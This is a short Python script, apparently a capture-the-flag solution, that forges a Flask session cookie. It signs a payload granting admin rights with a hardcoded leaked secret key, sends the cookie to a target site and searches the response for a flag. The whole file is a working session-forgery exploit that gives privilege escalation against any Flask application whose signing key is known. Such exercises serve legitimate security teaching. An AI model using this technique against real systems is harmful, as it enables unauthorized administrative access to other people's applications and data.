import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))

from utils import get_session, find_flag
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

TARGET_URL = "https://keyboard.quoccacorp.com"
SECRET_KEY = "$hallICompareTHEE2aSummersday"
PAYLOAD = {"admin": True, "secret_key": SECRET_KEY}

def main():
    app = Flask(__name__)
    app.secret_key = SECRET_KEY

    serializer = SecureCookieSessionInterface().get_signing_serializer(app)
    signed_flask_token = serializer.dumps(PAYLOAD)

    session = get_session()
    session.cookies.set("session", signed_flask_token)

    response = session.get(TARGET_URL)
    find_flag(response.text)

if __name__ == "__main__":
    main()